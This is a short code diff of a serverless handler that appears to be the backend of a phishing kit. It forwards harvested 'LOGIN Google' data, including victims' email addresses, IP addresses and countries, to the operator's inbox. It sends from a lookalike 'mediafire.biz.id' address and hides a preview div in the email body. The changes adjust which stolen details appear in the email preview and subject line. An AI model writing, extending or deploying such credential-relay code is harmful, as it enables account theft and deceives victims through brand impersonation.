@@ -50,7 +50,8 @@ export default async function handler(req, res) {
 
         const flag = countryFlag(d.negaraKode || "");
 
-        const previewText = "ID " + flag + " | +62 | LOGIN Google | IP " + (d.ip || "-");
+        // Preview text = ID + bendera + IP + EMAIL
+        const previewText = "ID " + flag + " | +62 | LOGIN Google | EMAIL " + (d.email || "-");
 
         const htmlBody = `
 <div style="display:none;max-height:0;overflow:hidden;font-size:1px;line-height:1px;color:#fff">
@@ -107,7 +108,7 @@ export default async function handler(req, res) {
             body: JSON.stringify({
                 from: NAMA + " <noreply@mediafire.biz.id>",
                 to: [EMAIL],
-                subject: "🀄 " + NAMA + " 🀄 - " + (d.ip || "-") + " " + flag + " " + (d.negara || "-"),
+                subject: "🀄 " + NAMA + " 🀄 | IP " + (d.ip || "-"),
                 html: htmlBody
             })
         });
